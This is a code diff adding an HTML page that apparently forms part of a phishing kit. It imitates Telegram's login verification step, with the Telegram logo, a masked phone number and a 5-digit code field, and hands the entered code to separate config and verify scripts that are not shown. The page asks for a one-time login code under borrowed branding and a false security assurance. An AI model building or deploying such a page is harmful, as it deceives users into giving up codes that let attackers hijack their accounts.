@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>otp code</title>
+  <!-- Google Fonts untuk tampilan modern -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/verify.css">
+</head>
+<body>
+  <div class="container">
+    <div class="icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="telegram-logo">
+    <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
+  </svg>
+  </div>
+    <div class="phone-display">
+      <span id="phoneMasked"></span>
+      <img src="https://cdn-icons-png.flaticon.com/512/1159/1159633.png" alt="Edit" class="pencil-icon" id="editNumber">
+    </div>
+    <h1>Enter verification code</h1>
+    <p>Your registration process is protected with two-step verification for security. </p>
+    <form id="codeForm">
+      <input type="number" id="verificationCode" min="10000" max="99999" placeholder="Enter 5 digit code" oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)">
+      <button type="submit" class="btn">NEXT</button>
+      
+     <div class="disclaimer">
+    *Make sure the verification code is not given to anyone. The verification process takes 1-2 minutes.
+    </div>
+    </form>
+    <div class="status" id="statusMessage"></div>
+  </div>
+
+<script src="../config.js"></script>
+<script src="../assets/js/verify.js"></script>
+
+</body>
+</html>
